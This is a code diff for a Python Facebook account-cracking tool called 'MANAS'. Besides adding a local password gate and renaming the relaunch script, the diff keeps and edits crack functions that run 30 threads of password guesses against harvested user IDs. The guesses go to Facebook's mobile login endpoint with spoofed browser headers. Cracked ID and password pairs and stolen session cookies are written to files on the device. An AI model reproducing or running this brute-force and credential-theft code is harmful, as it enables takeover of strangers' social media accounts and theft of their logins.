@@ -107,6 +107,82 @@ id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni=
 cokbrut=[]
 pwpluss,pwnya=[],[]
  
+ #---------------PASS------------#
+ if not os.path.exists("data"):
+    os.mkdir("data")
+try:open("data/name.xml", "r")
+except FileNotFoundError:
+    open("data/name.xml", "w")
+    pass
+try:open("data/password.xml", "r")
+except FileNotFoundError:
+    open("data/password.xml", "w")
+    pass
+def namepsw():
+    os.system('clear')
+    banner()
+    info()
+    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
+        with open("data/name.xml", "r") as name_file_obj:
+            uname = name_file_obj.readline().strip()
+    else:
+        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR REAL NAME")
+        linex()
+        uname = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR NAME : ")
+        linex()
+        with open("data/name.xml", "w") as name_file_obj:
+            name_file_obj.write(uname)
+    if os.path.exists("data/password.xml") and os.path.getsize("data/password.xml") > 0:
+        with open("data/password.xml", "r") as password_file_obj:
+            upass = password_file_obj.readline().strip()
+    else:
+        print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ADD A PSW TO YOUT ACCOUNT")
+        linex()
+        upass = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR PASSWORD : ")
+        linex()
+        with open("data/password.xml", "w") as password_file_obj:
+            password_file_obj.write(upass)
+    animation(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOUR DETAILS HAS BEEN CHANGED ")
+    restart()
+try:
+    with open('data/name.xml', 'r') as name_file:
+        uname = name_file.readline().strip()
+    with open('data/password.xml', 'r') as password_file:
+        upass = password_file.readline().strip()
+    if len(uname) > 1 and len(upass) > 1:
+        pass
+    else:
+        namepsw()
+except FileNotFoundError:
+    namepsw()
+except IOError:
+    namepsw()
+    
+def passask():
+    with open('data/password.xml', 'r') as file:
+        stored_password = file.read().strip()
+    linex()
+    user_password = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER THE PASSWORD : ")
+    if user_password == stored_password:
+        pass
+    else:
+        linex()
+        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m ACCESS DENIED !")
+        restart()
+        
+#------------------[ GREETINGS ]-----------------#
+
+current_time = datetime.datetime.now()
+current_hour = current_time.hour
+if 5 <= current_hour < 12:
+    greeting = "GOOD MORNING   : "
+elif 12 <= current_hour < 17:
+    greeting = "GOOD AFTERNOON : "
+elif 17 <= current_hour < 20:
+    greeting = "GOOD EVENING   : "
+else:
+    greeting = "GOOD NIGHT     : "
+        
  
 #------------[APPLICATION CHECKER-----------#
 def cek_apk(session,coki):
@@ -268,7 +344,7 @@ def login_lagi334():
     except Exception as e:
         os.system("rm -f .token.txt")
         os.system("rm -f .cok.txt")
-        os.system("python nono.py")
+        os.system("python v3.py")
         exit()
 
 #------------------[ MENU ]----------------#
@@ -298,7 +374,7 @@ def menu():
         crack_file()
     elif MANAS in ['2','02']:
         os.system('xdg-open https://wa.me/+8801608843956')
-        os.system("python nono.py")
+        os.system("python v3.py")
     elif MANAS in ['3','03']:
         result()
     elif MANAS in ['0']:
@@ -554,9 +630,8 @@ def passwrd():
     print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE :\033[1;92m "+date)
     print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
     print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
-    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
     print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
-    print('\033[0;97m===============================================')
+    print('\033[0;97m-----------------------------------------------------')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -625,7 +700,7 @@ def passwrd():
     print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
     print('\n\033[1;37m-----------------------------------------')
     woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
-    os.system("python nono.py")
+    os.system("python v3.py")
     exit()
  
 #--------------------[ METODE-B-API ]-----------------#
@@ -633,7 +708,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r{H}[MANAS-M1]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r {P}[MANAS]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -650,7 +725,7 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-               # print(f#'\r\033[0;94m[MANAS-Cp] {idf} • {pw}')
+            #   print(f#\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
                 #os.system#('espeak -a 300 " Cp,"')
                 open('/sdcard/MANAS-CP.txt','a').write(ids+'|'+pas+'\n')
                 akun.append(idf+' | '+pw)
@@ -675,7 +750,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[MANAS-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r {P}[MANAS]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -692,7 +767,7 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-               # print(f#'\r\033[0;95m[{time.strftime("%H:%M")}•MANAS-Cp] {idf} • {pw}')
+               print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
                # os.system#('espeak -a 300 " Cp,"')
                 open('/sdcard/MANAS-CP.txt','a').write(ids+'|'+pas+'\n')
                 akun.append(idf+' • '+pw)
@@ -702,7 +777,7 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•MANAS-Ok] {idf} | {pw} ')
+                print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
                 #os.system#('espeak -a 300 " Ok,  MANAS,  id"')
                 open('/sdcard/MANAS-OK.txt','a').write(uid+'|'+pas+'|'+kuki+'\n')
                 break
